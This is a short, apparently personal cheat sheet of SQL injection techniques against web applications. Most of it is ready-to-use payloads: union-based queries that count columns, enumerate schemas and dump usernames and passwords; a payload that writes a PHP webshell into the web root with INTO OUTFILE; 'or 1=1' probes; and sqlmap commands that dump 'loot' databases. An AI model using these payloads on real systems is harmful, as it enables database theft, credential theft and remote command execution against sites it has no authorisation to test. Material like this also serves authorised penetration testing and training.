
UNION BASED SQLI

  This will tell us how many columns there are by throwing an error at the first one that doesn't exist.
' ORDER BY 1-- // == Output should look like 'Unknown column "6"' == Tells us there are 5 columns

  Following command will show which columns are displayed
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //

  Try then running this, make sure first column is null because that column is usually reserved.
' UNION SELECT null, null, database(), user(), @@version  -- //

  This command finds tables
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

  Able to run commands like this
' UNION SELECT null, username, password, description, null FROM users -- //
  
  Can also insert write a .php file with a webshell
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

BASIC SQLI

find if field is vulnerable

' or 1=1 -- // 
' OR 1=1 in (SELECT * FROM users) -- //

next use sqlmap

1. use burp and copy the request to a file

2. use this command to enum dbs == sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch --dbs

3. infortion_schema and performance_schema are native to sql, you want to look at the others.

4. use this command to enum lootdb == sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D <lootdb> --tables

5. if you find an interesting table use this command to dump its data == sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D <lootdb> -T <loottables> --dump 
